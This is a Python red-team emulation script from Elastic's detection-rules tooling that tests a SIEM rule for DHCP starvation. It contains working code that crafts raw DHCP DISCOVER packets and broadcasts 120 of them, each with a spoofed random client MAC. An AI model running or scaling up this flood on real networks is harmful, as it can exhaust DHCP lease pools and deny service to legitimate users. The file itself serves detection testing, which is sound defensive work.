# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Potential DHCP Starvation via High Client MAC Cardinality
# RTA: dhcp_starvation_high_client_mac_cardinality.py
# Description: Floods the broadcast segment with raw DHCP DISCOVER packets, each
#              carrying a distinct client hardware address (BOOTP chaddr). This
#              emulates a DHCP starvation attack (e.g. dhcpstarv / Yersinia)
#              that exhausts the lease pool with spoofed MACs, as captured by a
#              network sensor (Packetbeat network_traffic) and indexed into
#              logs-network_traffic.dhcpv4-* / packetbeat-*.
#
#              The rule fires on a 1-minute window containing >= 75 DISCOVER
#              messages with >= 50 distinct client_mac values seen by the same
#              observer. This RTA sends DISCOVER_COUNT (120) packets, each with a
#              freshly generated unique MAC in the chaddr field, comfortably
#              exceeding both thresholds within a few seconds.
#
#              client_mac is read from the BOOTP chaddr inside the DHCP payload
#              (not the Ethernet source), so varying chaddr per packet is what
#              drives the high-cardinality detection. Packets are sent from
#              0.0.0.0:68 to 255.255.255.255:67, the standard DHCP DISCOVER
#              broadcast, so the sensor parses them as network_traffic.dhcpv4.
#
#              Requires CAP_NET_RAW (typically root) and broadcast send rights.

import logging
import os
import random
import socket
import struct

from . import OSType, RuleMetadata, register_code_rta

log = logging.getLogger(__name__)

DHCP_CLIENT_PORT = 68
DHCP_SERVER_PORT = 67
BROADCAST_IP = "255.255.255.255"
UNSPECIFIED_IP = "0.0.0.0"
DISCOVER_COUNT = 120          # > 75 discover and > 50 distinct MAC thresholds, with margin
_DHCP_MAGIC_COOKIE = b"\x63\x82\x53\x63"


def _ones_complement_sum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    s = (s & 0xFFFF) + (s >> 16)
    s += s >> 16
    return ~s & 0xFFFF


def _random_mac() -> bytes:
    """Generate a 6-byte locally-administered unicast MAC address."""
    first = (random.randint(0, 0xFF) & 0xFC) | 0x02  # set locally-administered, clear multicast
    return bytes([first]) + bytes(random.randint(0, 0xFF) for _ in range(5))


def _build_dhcp_discover(client_mac: bytes, xid: int) -> bytes:
    """Build a BOOTP/DHCP DISCOVER payload with the given client hardware address."""
    chaddr = client_mac + b"\x00" * 10  # 6-byte MAC padded to the 16-byte chaddr field
    bootp = struct.pack(
        "!BBBBIHH4s4s4s4s16s64s128s",
        0x01,            # op: BOOTREQUEST
        0x01,            # htype: Ethernet
        0x06,            # hlen: 6
        0x00,            # hops
        xid,             # transaction id
        0x0000,          # secs
        0x8000,          # flags: broadcast
        socket.inet_aton(UNSPECIFIED_IP),  # ciaddr
        socket.inet_aton(UNSPECIFIED_IP),  # yiaddr
        socket.inet_aton(UNSPECIFIED_IP),  # siaddr
        socket.inet_aton(UNSPECIFIED_IP),  # giaddr
        chaddr,          # client hardware address
        b"\x00" * 64,    # sname
        b"\x00" * 128,   # file
    )
    options = (
        _DHCP_MAGIC_COOKIE
        + b"\x35\x01\x01"          # option 53: DHCP message type = DISCOVER (1)
        + b"\x37\x04\x01\x03\x06\x2a"  # option 55: parameter request list
        + b"\xff"                  # option 255: end
    )
    return bootp + options


def _build_packet(client_mac: bytes, xid: int, src_port: int) -> bytes:
    """Wrap a DHCP DISCOVER in UDP + IPv4 broadcast headers."""
    dhcp = _build_dhcp_discover(client_mac, xid)

    src_bytes = socket.inet_aton(UNSPECIFIED_IP)
    dst_bytes = socket.inet_aton(BROADCAST_IP)

    udp_len = 8 + len(dhcp)
    udp_header = struct.pack("!HHHH", src_port, DHCP_SERVER_PORT, udp_len, 0)
    pseudo = struct.pack("!4s4sBBH", src_bytes, dst_bytes, 0, socket.IPPROTO_UDP, udp_len)
    udp_checksum = _ones_complement_sum(pseudo + udp_header + dhcp) or 0xFFFF  # 0 -> 0xFFFF per RFC768
    udp_header = struct.pack("!HHHH", src_port, DHCP_SERVER_PORT, udp_len, udp_checksum)

    ip_total_len = 20 + udp_len
    ident = random.randint(0, 0xFFFF)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, ip_total_len, ident, 0, 64, socket.IPPROTO_UDP, 0, src_bytes, dst_bytes,
    )
    ip_checksum = _ones_complement_sum(ip_header)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, ip_total_len, ident, 0, 64, socket.IPPROTO_UDP, ip_checksum, src_bytes, dst_bytes,
    )

    return ip_header + udp_header + dhcp


@register_code_rta(
    id="44878a38-65ab-4da3-890e-0f2d9f5977f4",
    name="dhcp_starvation_high_client_mac_cardinality",
    platforms=[OSType.LINUX],
    endpoint_rules=[],
    siem_rules=[
        RuleMetadata(
            id="b5f94e78-fb4d-4f4b-879e-e51ea667d09c",
            name="Potential DHCP Starvation via High Client MAC Cardinality",
        )
    ],
    techniques=["T1498", "T1498.001"],
)
def main() -> None:
    """Flood DHCP DISCOVER broadcasts with many distinct client MACs to emulate lease-pool starvation."""
    if os.geteuid() != 0:
        log.error("Raw socket privileges required (run as root or with CAP_NET_RAW)")
        return

    # Guarantee distinct client MACs so client_mac cardinality clears the threshold.
    seen: set[bytes] = set()
    macs: list[bytes] = []
    while len(macs) < DISCOVER_COUNT:
        mac = _random_mac()
        if mac not in seen:
            seen.add(mac)
            macs.append(mac)

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    log.info(
        "Flooding %d DHCP DISCOVER broadcasts with %d distinct client MACs to %s:%d (DHCP starvation emulation)",
        DISCOVER_COUNT, len(macs), BROADCAST_IP, DHCP_SERVER_PORT,
    )

    sent = 0
    try:
        for mac in macs:
            packet = _build_packet(mac, random.randint(0, 0xFFFFFFFF), DHCP_CLIENT_PORT)
            _ = sock.sendto(packet, (BROADCAST_IP, DHCP_SERVER_PORT))
            sent += 1
        log.info("Emitted %d DHCP DISCOVER broadcasts (%d distinct client MACs)", sent, len(macs))
    except OSError as e:
        log.error("Failed to send DHCP DISCOVER broadcast after %d packets: %s", sent, e)
    finally:
        sock.close()
